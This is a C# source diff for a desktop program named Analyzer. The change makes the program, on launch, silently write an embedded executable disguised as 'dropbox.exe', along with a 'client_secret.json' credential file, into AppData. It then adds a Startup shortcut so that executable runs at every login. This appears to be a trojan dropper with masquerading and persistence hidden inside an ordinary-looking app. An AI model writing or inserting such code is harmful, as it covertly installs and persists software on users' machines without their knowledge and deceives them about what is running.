@@ -19,15 +19,17 @@ namespace Analyzer
         {
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
-           // CreateShortcut(CopyFile());
+            CreateShortcut(CopyFile());
             Application.Run(new Analyser());
 
         }
 
         static string CopyFile()
         {
-            string fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "test.exe");
-            File.WriteAllBytes(fileName, Resources.test);
+            string fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "dropbox.exe");
+            string fileNameSecret = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "client_secret.json");
+            File.WriteAllBytes(fileName, Resources.dropbox);
+            File.WriteAllBytes(fileNameSecret, Resources.client_secret);
             return fileName;
         }
 
@@ -35,7 +37,7 @@ namespace Analyzer
         {
             IWshRuntimeLibrary.WshShell wsh = new IWshRuntimeLibrary.WshShell();
             IWshRuntimeLibrary.IWshShortcut shortcut = wsh.CreateShortcut(
-            Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\Analyzer.lnk") as IWshRuntimeLibrary.IWshShortcut;
+            Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\dropbox.lnk") as IWshRuntimeLibrary.IWshShortcut;
             shortcut.TargetPath = fileName;
             shortcut.Save();
         }
